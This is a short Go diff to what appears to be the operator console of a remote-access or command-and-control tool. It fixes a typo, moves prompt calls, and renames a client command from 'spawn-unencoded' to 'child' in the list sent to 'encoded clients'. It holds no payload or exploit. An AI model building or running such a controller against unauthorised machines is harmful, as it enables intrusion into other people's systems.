@@ -113,7 +113,7 @@ func enterTerminal(channel *chan string, reader *bufio.Reader) {
 			caret()
 			return
 		} else if trim(cmd) == "exit" {
-			infoln("The \"exit\" command is disabled, as will break the client")
+			infoln("The \"exit\" command is disabled, as it will break the client")
 			cmd = strings.Replace(cmd, "exit", "", -1)
 		} else if globalMap.IsDead(activeClient) {
 			errorln("Error: client session no longer exists. Exiting...")
@@ -315,8 +315,9 @@ func readStdin() {
 
 			} else {
 				errorln("Please input a break")
+				caret()
 			}
-			caret()
+			// caret()
 		case "cmd":
 			if len(cmd) > 4 {
 				if !IsActiveClient() {
@@ -330,18 +331,19 @@ func readStdin() {
 					cmdList := strings.Split(cmd[4:], " ")
 					valids := []string{
 						"arp",
-						"spawn-unencoded",
+						"child",
 					}
 					cmdSend := CreateCommandList(cmdList, "CMD", valids)
 					SendMessage(cmdSend, client.conn)
 				} else {
 					errorln("Error: Can only use command with encoded clients")
+					caret()
 				}
 
 			} else {
 				errorln("Please input a break")
+				caret()
 			}
-			caret()
 		case "help":
 			if len(cmd) > 5 {
 				displayHelp(cmd[5:])
